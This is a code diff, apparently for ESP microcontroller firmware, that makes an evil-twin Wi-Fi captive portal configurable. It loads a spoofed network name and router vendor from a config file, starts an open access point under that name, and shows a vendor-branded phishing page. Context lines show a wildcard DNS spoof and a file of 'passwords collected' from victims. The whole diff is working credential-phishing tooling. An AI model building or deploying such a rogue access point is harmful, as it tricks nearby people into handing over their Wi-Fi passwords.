@@ -53,20 +53,63 @@ void display_potfile() {
   potfile.close();
 }
 
+typedef struct Config {
+  bool error;
+  String essid;
+  String vendor;
+} Config;
+
+Config load_config() {
+  File config_file = LittleFS.open("config.ini", "r");
+  if (!config_file) {
+    Serial.println("fatal: failed to open config for reading");
+    return Config { error: true };
+  }
+
+  String fragment;
+  String essid;
+  String vendor;
+  bool key { true };
+  int captured = 0;
+  while(config_file.available()) {
+    if (key) {
+      fragment = config_file.readStringUntil('=');
+      key = false;
+      continue;
+    }
+    if (fragment == "essid") {
+      captured++;
+      essid = config_file.readStringUntil('\n');
+    }
+    if (fragment == "vendor") {
+      captured++;
+      vendor = config_file.readStringUntil('\n');
+    }
+    key = true;
+  }
+  if (captured == 2) return Config { error: false, essid: essid, vendor: vendor };
+  return Config { error: true };
+}
+
 void setup() {
   Serial.begin(115200);
   Serial.println("\r");
   Serial.println("core::setup starting ap");
   
-  WiFi.softAPConfig(gateway, gateway, subnet);
-  WiFi.softAP("Full_House", "peepeepoopoo");
-
   if (!LittleFS.begin()){
     Serial.println("error: failed to mount LittleFS");
     return;
   }
   Serial.println("core::setup displaying passwords collected");
   display_potfile();
+
+  Config config = load_config();
+  if (config.error) {
+    Serial.println("fatal: configuration file is invalid");
+    return;
+  }
+  WiFi.softAPConfig(gateway, gateway, subnet);
+  WiFi.softAP(config.essid);
 
   File web_file = LittleFS.open("index.html", "r");
   if (!web_file) {
@@ -76,7 +119,7 @@ void setup() {
 
   webpage = web_file.readString();
   web_file.close();
-  webpage.replace("VENDOR", "peepeepoopoo");
+  webpage.replace("VENDOR", config.vendor);
 
   // pretend to be the gateway and every other site in existence
   dns.start(DNS_PORT, "*", gateway);
